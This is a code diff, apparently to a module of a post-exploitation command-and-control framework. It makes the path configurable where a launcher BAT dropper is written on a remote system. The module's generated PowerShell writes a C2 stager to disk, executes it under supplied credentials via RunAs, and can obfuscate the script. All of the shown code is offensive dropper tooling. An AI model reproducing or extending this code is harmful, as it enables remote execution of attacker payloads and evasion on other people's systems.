@@ -60,6 +60,11 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'DropperPath' : {
+                'Description'   :   'Location on remote system to save BAT File for RunAs',
+                'Required'      :   False,
+                'Value'         :   '$env:public\debug.bat'
+            },
             'Listener' : {
                 'Description'   :   'Listener to use.',
                 'Required'      :   True,
@@ -145,7 +150,7 @@ class Module(object):
         launcherCode = l.generate()
 
         # PowerShell code to write the launcher.bat out
-        scriptEnd = "$tempLoc = \"$env:public\debug.bat\""
+        scriptEnd = "$tempLoc = \"%s\"" % (self.options['DropperPath']['Value'])
         scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
         scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
@@ -158,7 +163,8 @@ class Module(object):
         if(domain and domain != ""):
             scriptEnd += "-Domain %s " %(domain)
 
-        scriptEnd += "-Cmd \"$env:public\debug.bat\""
+        scriptEnd += "-Cmd \"%s\"" % (self.options['DropperPath']['Value'])
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
